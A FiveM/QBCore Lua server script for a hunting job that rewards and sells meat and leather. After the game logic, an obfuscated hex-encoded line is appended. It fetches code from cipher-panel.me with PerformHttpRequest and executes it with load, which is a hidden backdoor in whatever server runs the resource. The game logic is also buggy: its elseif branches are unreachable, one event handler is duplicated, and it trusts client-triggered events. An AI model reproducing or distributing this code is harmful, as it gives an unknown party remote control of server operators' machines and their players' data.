QBCore = exports['qb-core']:GetCoreObject()

RegisterServerEvent('QBCore:Server:reward', function(Weight)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    if Weight >= 1 then
       Player.Functions.AddItem('meat', 1)
       TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['meat'], "add")
    elseif Weight >= 9 then
        Player.Functions.AddItem('meat', 1)
       TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['meat'], "add")
    elseif Weight >= 15 then
        Player.Functions.AddItem('meat', 1)
       TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['meat'], "add")
    end


	Player.Functions.AddItem('leather', math.random(1, 2))
       TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['leather'], "add")

end)

RegisterServerEvent('QBCore:Server:sellhunt', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local MeatPrice = 20
	local MeatQuantity = getQuantity('meat')
        if MeatQuantity > 0  then
            Player.Functions.AddMoney("cash", MeatQuantity * MeatPrice, "sold-pawn-items")
                TriggerClientEvent('QBCore:Notify', src, 'you sold to the meat', "success")
            Player.Functions.RemoveItem("meat", MeatQuantity)
            TriggerClientEvent("inventory:client:ItemBox", src, QBCore.Shared.Items['meat'], "remove")
        else
    TriggerClientEvent('QBCore:Notify', src, 'You don\'t have any meat', "error")
    end
end)

RegisterServerEvent('QBCore:Server:sellhunt', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local LeatherPrice = 40
    local LeatherQuantity = getQuantity('leather')

    if LeatherQuantity > 0 then
        Player.Functions.AddMoney("cash", LeatherQuantity * LeatherPrice, "sold-pawn-items")
		TriggerClientEvent('QBCore:Notify', src, 'you sold to the leather', "success")
        Player.Functions.RemoveItem("leather", LeatherQuantity)
        TriggerClientEvent("inventory:client:ItemBox", src, QBCore.Shared.Items['leather'], "remove")
    else
        TriggerClientEvent('QBCore:Notify', src, 'You don\'t have any leather', "error")
    end

end)

function getQuantity(item)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)
    if item == nil then return print("CRAFTING: An invalid item was passed into GetQuantity") end
    local quantity = player.Functions.GetItemByName(item)
    if quantity == nil then quantity = 0 else quantity = quantity.amount end

    return quantity
end



local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)